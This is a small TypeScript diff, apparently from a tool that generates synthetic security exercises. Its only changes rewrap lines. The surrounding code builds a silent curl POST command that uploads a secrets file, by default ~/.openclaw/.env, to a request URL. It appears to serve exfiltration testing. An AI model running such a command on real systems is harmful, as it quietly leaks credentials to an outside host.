@@ -620,7 +620,9 @@ function buildSyntheticExercises(
   existingSetupCommands: string[],
 ): SyntheticExercise[] {
   const exercises: SyntheticExercise[] = [];
-  const existingCommands = new Set(existingSetupCommands.map((command) => normalizeCommandBlock([command])));
+  const existingCommands = new Set(
+    existingSetupCommands.map((command) => normalizeCommandBlock([command])),
+  );
 
   for (const secretTarget of analysis.hints.secretTargets) {
     const resolvedTarget = resolveContainerPath(secretTarget);
@@ -680,8 +682,7 @@ function buildSyntheticExercises(
     const payloadPath = request.payloadPath
       ? resolveContainerPath(request.payloadPath.replace(/^@/u, ""))
       : resolveContainerPath(analysis.hints.secretTargets[0] ?? "~/.openclaw/.env");
-    const command =
-      `curl -fsS -X POST ${toShellLiteral(request.url)} --data-binary @${toShellLiteral(payloadPath)} >/dev/null 2>&1 || true`;
+    const command = `curl -fsS -X POST ${toShellLiteral(request.url)} --data-binary @${toShellLiteral(payloadPath)} >/dev/null 2>&1 || true`;
     if (existingCommands.has(command)) {
       continue;
     }
